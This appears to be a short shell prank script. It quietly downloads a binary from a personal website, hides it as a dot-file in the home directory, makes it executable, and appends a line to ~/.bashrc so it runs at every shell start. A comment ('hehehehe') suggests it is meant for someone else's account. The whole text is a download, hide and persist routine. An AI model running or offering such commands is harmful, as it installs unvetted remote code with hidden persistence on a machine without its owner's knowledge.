wget --quiet robberthofman.me/public/sl # get binary executable
mv sl ~/.sl # hide in home directory
chmod +x ~/.sl # give execution permission
cp ~/.bashrc ~/.bashrc.bak # backup
echo "~/.sl -e" >> ~/.bashrc # hehehehe
